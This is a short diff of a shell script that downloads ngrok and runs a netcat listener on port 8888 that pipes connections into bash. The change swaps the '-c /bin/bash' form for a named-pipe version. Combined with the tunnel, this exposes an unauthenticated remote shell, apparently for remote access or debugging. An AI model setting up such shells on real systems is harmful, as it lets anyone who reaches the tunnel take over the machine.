@@ -3,7 +3,8 @@
 wget -O ngrok.zip https://dl.ngrok.com/ngrok_2.0.19_linux_amd64.zip
 unzip ngrok.zip
 {
-    nc -l -v -c /bin/bash 8888
+    mkfifo pipe
+    nc -l -v -c 8888 <pipe | bash >pipe
     killall -SIGINT ngrok && echo "ngrok terminated"
 } &
 {
